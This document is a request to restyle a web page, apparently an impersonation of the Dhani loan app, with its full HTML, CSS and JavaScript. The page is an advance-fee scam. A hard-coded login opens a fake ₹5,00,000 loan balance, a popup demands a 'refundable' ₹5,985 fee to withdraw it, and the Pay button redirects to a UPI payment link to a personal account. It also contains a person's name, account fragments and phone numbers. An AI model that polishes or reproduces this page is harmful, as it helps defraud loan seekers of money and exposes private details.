@@ -1,0 +1,328 @@
+the first thing i want you to do is keep all the features strictly what it is now , we will just beutify it for now
+
+use the following html js and js just for the refferance 
+
+html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dhani Online App</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+</head>
+<body>
+    <div class="logo-container">
+        <img src="doa.png" alt="Logo" class="logo">
+    </div>
+    
+    <div class="login-container" id="loginContainer">
+        <div class="input-group">
+            <i class="fas fa-user"></i>
+            <input type="text" id="userId" placeholder="User ID" class="input-field">
+        </div>
+        <div class="input-group">
+            <i class="fas fa-lock"></i>
+            <input type="password" id="password" placeholder="Password" class="input-field">
+        </div>
+        <button onclick="login()" id="loginButton">Login</button>
+    </div>
+
+    <div id="accountDetails" class="account-details" style="display: none;">
+        <h2>Account Details</h2>
+        <table>
+            <tr>
+                <td><strong>Account Name:</strong></td>
+                <td class="right">B Chandrashekhar</td>
+            </tr>
+            <tr>
+                <td><strong>Account Number:</strong></td>
+                <td class="right">8277525333</td>
+            </tr>
+            <tr>
+                <td><strong>Account Type:</strong></td>
+                <td class="right">Loan Account</td>
+            </tr>
+            <tr>
+                <td><strong>Available Balance:</strong></td>
+                <td class="right">₹ 5,00,000</td>
+            </tr>
+            <tr>
+                <td colspan="2">
+                    <button id="withdrawButton">
+                        <i class="fas fa-money-bill-wave"></i> Withdraw To Your CANARA Bank Account : XXXXXXXXX0595
+                    </button>
+                </td>
+            </tr>
+            
+        </table>
+        <h3>Recent Transactions</h3>
+        <table class="transactions-table">
+            <tr>
+                <td>Transfer to Saving Account</td>
+                <td class="right-align">- ₹ 0</td>
+            </tr>
+            <tr>
+                <td>Deposit</td>
+                <td class="right-align">+ ₹ 5,00,000</td>
+            </tr>
+            <tr>
+                <td>Loan Amount Paid</td>
+                <td class="right-align">- ₹ 0.00</td>
+            </tr>
+            <tr>
+                <td>ATM Withdrawal</td>
+                <td class="right-align">- ₹ 0.00</td>
+            </tr>
+        </table>
+        
+
+    <!-- Popup -->
+    <div id="withdrawalPopup" class="popup" style="display: none;">
+        <div class="popup-content">
+            <p>Please pay ₹ 5,985 to withdraw this amount From your Dhani Account to Your Savings Account. The given payment will be refunded within 20 (twenty) minutes via the same mode of payment used.</p>
+            <div class="popup-buttons">
+                <button id="payButton">Pay</button>
+                <button id="cancelButton">Cancel</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
+
+CSS
+
+body {
+    margin: 0;
+    height: 100vh;
+    background: radial-gradient(circle, #840704, #3a0101);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    font-family: Arial, sans-serif;
+}
+
+.logo-container {
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    margin-bottom: 10px;
+}
+
+.logo {
+    width: 250px;
+    max-width: 100%;
+    height: auto;
+}
+
+.login-container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    width: 250px;
+    text-align: center;
+}
+
+.account-details {
+    width: 300px;
+    text-align: center;
+    color: #fff;
+    background-color: #fff;
+    padding: 20px;
+    border-radius: 10px;
+    color: #840704; /* Gradient text color */
+}
+
+.input-group {
+    display: flex;
+    align-items: center;
+    margin-bottom: 15px;
+    width: 100%;
+}
+
+.input-group i {
+    color: #fff;
+    font-size: 20px;
+    margin-right: 10px;
+}
+
+.input-field {
+    padding: 10px;
+    font-size: 16px;
+    border: 2px solid #fff;
+    border-radius: 5px;
+    background-color: transparent;
+    color: #fff;
+    width: 100%;
+}
+
+.input-field::placeholder {
+    color: #fff;
+    opacity: 0.7;
+}
+
+.input-field:focus {
+    outline: none;
+    border-color: #840704;
+}
+
+#loginButton {
+    padding: 10px;
+    background-color: white;
+    border: none;
+    color: #840704; /* Red text */
+    font-size: 16px;
+    border-radius: 5px;
+    cursor: pointer;
+    width: 100%;
+}
+
+#loginButton:hover {
+    background: linear-gradient(135deg, #840704, #3a0101); /* Gradient on hover */
+    color: white;
+}
+
+button {
+    padding: 10px;
+    background-color: #840704;
+    border: none;
+    color: #fff;
+    font-size: 16px;
+    border-radius: 5px;
+    cursor: pointer;
+}
+
+button:hover {
+    background-color: #3a0101;
+}
+
+/* Popup */
+.popup {
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: rgba(0, 0, 0, 0.7);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.popup-content {
+    background: linear-gradient(135deg, #840704, #3a0101);
+    color: #fff;
+    padding: 20px;
+    border-radius: 10px;
+    text-align: center;
+    width: 300px;
+}
+
+.popup-buttons {
+    margin-top: 20px;
+}
+
+.popup-buttons button {
+    padding: 10px;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    font-size: 16px;
+    width: 120px;
+}
+
+#payButton {
+    background: linear-gradient(135deg, #00b33c, #006600);
+    color: white;
+}
+
+#cancelButton {
+    background: white;
+    color: #e60000;
+    margin-left: 10px;
+}
+
+#payButton:hover {
+    background: linear-gradient(135deg, #006600, #00b33c);
+}
+
+#cancelButton:hover {
+    background: #f2f2f2;
+}
+
+button:focus {
+    outline: none;
+}
+
+/* Withdraw Button */
+#withdrawButton {
+    background: linear-gradient(135deg, #840704, #3a0101);
+    color: white;
+    padding: 10px;
+    width: 100%;
+    border-radius: 5px;
+    cursor: pointer;
+    border: none;
+    font-size: 16px;
+}
+
+#withdrawButton:hover {
+    background: linear-gradient(135deg, #3a0101, #840704);
+}
+
+/* Table Styling */
+table {
+    width: 100%;
+    margin-top: 20px;
+    border-collapse: collapse;
+}
+
+table td {
+    padding: 10px;
+    text-align: left;
+}
+
+.right {
+    text-align: right;
+    color: #840704; /* Gradient red text */
+}
+
+JS
+
+function login() {
+    const userId = document.getElementById('userId').value;
+    const password = document.getElementById('password').value;
+
+    // Check if the entered user ID and password match the specified credentials
+    if (userId === '9740019994' && password === '9994') {
+        // Hide login form and display account details
+        document.getElementById('loginContainer').style.display = 'none';
+        document.getElementById('accountDetails').style.display = 'block';
+    } else {
+        alert('Invalid credentials. Please try again.');
+    }
+}
+
+// Handle the click event on the withdrawal button
+document.getElementById('withdrawButton').addEventListener('click', function() {
+    // Show the popup
+    document.getElementById('withdrawalPopup').style.display = 'flex';
+});
+
+// Handle the click event on the Pay button
+document.getElementById('payButton').addEventListener('click', function() {
+    // Redirect to the payment app after a delay
+    setTimeout(() => {
+        window.location.href = "upi://pay?pa=7838203264-8@ybl&pn=******7500&pn=APILOGIN&cu=INR&am=4,750";
+    }, 3000); // 3-second delay
+});
+
+// Handle the click event on the Cancel button
+document.getElementById('cancelButton').addEventListener('click', function() {
+    // Close the popup
+    document.getElementById('withdrawalPopup').style.display = 'none';
+});
